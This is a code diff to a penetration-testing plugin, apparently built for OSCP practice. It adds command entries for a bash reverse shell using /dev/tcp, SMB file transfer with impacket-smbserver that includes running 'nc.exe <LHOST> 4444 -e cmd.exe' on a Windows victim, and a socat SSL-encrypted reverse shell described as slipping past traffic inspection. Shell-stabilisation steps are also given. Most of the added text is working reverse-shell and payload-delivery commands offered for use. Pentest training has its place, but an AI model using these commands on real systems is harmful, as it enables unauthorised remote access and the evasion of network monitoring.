@@ -30,7 +30,7 @@ class C2OperationsPlugin(ServicePlugin):
 
     @property
     def service_names(self) -> List[str]:
-        return []  # Manual trigger only
+        return []  # Manual trigger only - no service detection
 
     def detect(self, port_info: Dict[str, Any]) -> bool:
         """
@@ -1224,6 +1224,145 @@ Python 2: python -m SimpleHTTPServer 8000
                             'PHP built-in server: php -S 0.0.0.0:8000'
                         ],
                         'tags': ['OSCP:HIGH', 'QUICK_WIN', 'FILE_TRANSFER']
+                    }
+                },
+                {
+                    'id': f'bash-reverse-shell-{target}',
+                    'name': 'Bash Reverse Shell (Linux)',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'nc -lvnp 4444',
+                        'description': 'Bash TCP reverse shell (works on most Linux systems)',
+                        'flag_explanations': {
+                            '-l': 'Listen mode',
+                            '-v': 'Verbose output',
+                            '-n': 'No DNS resolution',
+                            '-p 4444': 'Port to listen on'
+                        },
+                        'notes': '''
+Execute on victim:
+bash -i >& /dev/tcp/<LHOST>/4444 0>&1
+
+Alternative without /dev/tcp:
+bash -c 'exec 5<>/dev/tcp/<LHOST>/4444;cat <&5|while read line;do $line 2>&5 >&5;done'
+
+Stabilize shell:
+python -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+stty rows 38 columns 116
+''',
+                        'alternatives': [
+                            'Python reverse shell: python -c "import socket,subprocess,os;s=socket.socket(...)"',
+                            'Perl reverse shell',
+                            'PHP reverse shell',
+                            'Netcat with -e: nc <LHOST> 4444 -e /bin/bash'
+                        ],
+                        'success_indicators': [
+                            'Shell prompt received',
+                            'Commands execute successfully',
+                            'TTY stabilized'
+                        ],
+                        'failure_indicators': [
+                            'Connection refused',
+                            'Firewall blocking outbound connections',
+                            '/dev/tcp not available (use alternative)'
+                        ],
+                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN', 'LINUX']
+                    }
+                },
+                {
+                    'id': f'smb-file-transfer-{target}',
+                    'name': 'SMB File Transfer (Impacket smbserver)',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'impacket-smbserver share . -smb2support',
+                        'description': 'Host SMB share for file transfers to/from Windows targets',
+                        'flag_explanations': {
+                            'impacket-smbserver': 'Impacket SMB server tool',
+                            'share': 'Share name',
+                            '.': 'Current directory to share',
+                            '-smb2support': 'Enable SMB2 protocol (required for modern Windows)'
+                        },
+                        'notes': '''
+Execute on Windows victim:
+- Copy from share: copy \\\\<LHOST>\\share\\file.exe C:\\temp\\file.exe
+- Execute from share: \\\\<LHOST>\\share\\nc.exe <LHOST> 4444 -e cmd.exe
+- List share: net view \\\\<LHOST>
+
+With authentication:
+impacket-smbserver share . -smb2support -username user -password pass
+
+Mount on Linux:
+mount -t cifs //<LHOST>/share /mnt -o username=user,password=pass
+''',
+                        'alternatives': [
+                            'Python HTTP server',
+                            'FTP server',
+                            'WebDAV server',
+                            'Native Windows file sharing'
+                        ],
+                        'success_indicators': [
+                            'SMB server started successfully',
+                            'Share accessible from Windows target',
+                            'Files transfer successfully'
+                        ],
+                        'failure_indicators': [
+                            'Port 445 blocked by firewall',
+                            'SMB1 required (add -smb2support)',
+                            'Authentication failed'
+                        ],
+                        'tags': ['OSCP:HIGH', 'FILE_TRANSFER', 'WINDOWS', 'QUICK_WIN']
+                    }
+                },
+                {
+                    'id': f'socat-shell-{target}',
+                    'name': 'Socat Encrypted Shell',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork STDOUT',
+                        'description': 'Encrypted reverse shell using socat with SSL/TLS',
+                        'flag_explanations': {
+                            'OPENSSL-LISTEN:443': 'Listen on port 443 with SSL/TLS encryption',
+                            'cert=server.pem': 'SSL certificate file',
+                            'verify=0': 'Do not verify client certificate',
+                            'fork': 'Handle multiple connections'
+                        },
+                        'notes': '''
+Generate certificate:
+openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
+cat server.key server.crt > server.pem
+
+Execute on victim (Linux):
+socat OPENSSL:<LHOST>:443,verify=0 EXEC:/bin/bash
+
+Execute on victim (Windows):
+socat.exe OPENSSL:<LHOST>:443,verify=0 EXEC:'cmd.exe',pipes
+
+Advantages:
+- Encrypted traffic (bypasses basic traffic inspection)
+- Appears as HTTPS traffic
+- More stable than netcat
+- TTY support: socat OPENSSL:<LHOST>:443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+''',
+                        'alternatives': [
+                            'Netcat with SSL: ncat --ssl -lvnp 443',
+                            'SSH reverse tunnel',
+                            'OpenSSL reverse shell',
+                            'Metasploit reverse_https payload'
+                        ],
+                        'success_indicators': [
+                            'Socat listener started',
+                            'Client connects successfully',
+                            'Encrypted shell established'
+                        ],
+                        'failure_indicators': [
+                            'Certificate error',
+                            'Socat not installed on victim',
+                            'Port 443 blocked'
+                        ],
+                        'tags': ['OSCP:MEDIUM', 'ENCRYPTED', 'STEALTH', 'MANUAL']
                     }
                 }
             ]
